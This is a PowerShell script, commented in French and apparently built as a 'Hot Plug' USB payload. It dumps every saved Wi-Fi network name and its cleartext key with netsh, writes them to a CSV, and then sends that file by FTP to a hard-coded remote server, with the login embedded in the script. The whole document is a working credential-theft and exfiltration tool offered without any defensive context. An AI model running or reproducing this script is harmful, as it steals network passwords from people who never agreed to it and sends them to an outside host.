$wifi=@()
#Visualisation des réseaux bloqués
$cmd0=netsh wlan show blockednetworks
#Liste des SSID
$cmd1=netsh wlan show profiles
ForEach($row1 in $cmd1)
{
    #Récupération des ssids par expression régulière
    If($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$')
    {
        $ssid=$Matches[1]
        $cmd2=netsh wlan show profiles $ssid key=clear
        ForEach($row2 in $cmd2)
        {
            #Récupération des clés par expression régulière
            If($row2 -match 'Contenu de la c[^:]+:.(.+)$')
            {
                $key=$Matches[1]
                #Stockage des ssids et des clés dans un tableau
                $wifi+=[PSCustomObject]@{ssid=$ssid;key=$key}
            }
        }
    }
}

$wifi | Export-CSV -Path "$env:USERPROFILE\Documents\Hot Plug\Script\output.csv" -NoTypeInformation



Import-Module WinSCP

# Paramètres FTP
$ftpServer = "172.20.10.5"
$ftpUsername = "branavan"
$ftpPassword = "9559"

# Chemin distant sur le serveur FTP
$remoteCsvFilePath = "/home/branavan/Fichier.csv"

# Chemin local du fichier CSV à envoyer
$localCsvFilePath = "$env:USERPROFILE\Documents\cours\Hot Plug\Script\output.csv"

# Créer la session WinSCP
$sessionOptions = New-Object WinSCP.SessionOptions -Property @{
    Protocol = [WinSCP.Protocol]::Ftp
    HostName = $ftpServer
    UserName = $ftpUsername
    Password = $ftpPassword
}

$session = New-Object WinSCP.Session

try {
 
    $session.Open($sessionOptions)

   
    $transferOptions = New-Object WinSCP.TransferOptions
    $transferResult = $session.PutFiles($localCsvFilePath, $remoteCsvFilePath, $False, $transferOptions)

    
    if ($transferResult.IsSuccess) {
        Write-Host "Transfert réussi!"
    } else {
        Write-Host "Échec du transfert."
        foreach ($transferError in $transferResult.Failures) {
            Write-Host "Erreur : $($transferError.Message)"
        }
    }
} finally {
    $session.Dispose()
}